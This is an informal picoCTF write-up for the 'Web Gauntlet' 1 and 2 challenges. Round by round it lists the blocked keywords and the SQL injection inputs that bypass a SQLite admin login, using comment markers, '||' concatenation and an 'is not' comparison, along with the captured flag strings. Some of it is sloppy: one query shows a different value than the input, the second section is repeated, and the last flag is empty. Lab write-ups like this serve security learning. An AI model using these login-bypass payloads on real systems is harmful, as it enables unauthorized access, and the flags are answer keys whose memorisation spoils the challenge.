web gauntlet-1:
1)in the first level the word filtered is 'or' so we type 
         username : admin'-- 
          as we have to login as admin           (hence round 1 cleared)
2)now the filtered list   or and like = --     so now the 
         username : admin'/*
         password : anything
         round 2 cleared, as we can also comment using /* sqlite
3)filter list    or and = like < > --
        username : admin'/*
        password : anything
      round 3 cleared, as we can also comment using /* sqlite
4)filer list    or and = like < > -- admin
        username : ad'||'min'/*
        password: anything 
        round 4 cleared , as we can concatenate the string using || in sqlite
5)filter list      or and = like < > -- union admin
        username : ad'||'min'/*
        password : anything
        round 5 cleared , as we dint use union, blocking it doesnt change the answer from the prev one

te flag is picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}, it also gave me the source code in php for all this 



web gauntlet-2:
filtered list     or and true false union like = > < ; -- /* */ admin
        username: ad'||'min
        password: ' is not '.
        this generates a query like this    SELECT *FROM users WHERE username = 'ad'||'min' AND password = '' is not 'l';
        this generates password is true as NULL is not equal to l
        hence giving the flag is picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}, and also gives the source code

filtered list     or and true false union like = > < ; -- /* */ admin
        username: ad'||'min
        password: ' is not '.
        this generates a query like this    SELECT *FROM users WHERE username = 'ad'||'min' AND password = '' is not '.';
        this generates password is true as NULL is not equal to .
        hence the flag is picoctf{}
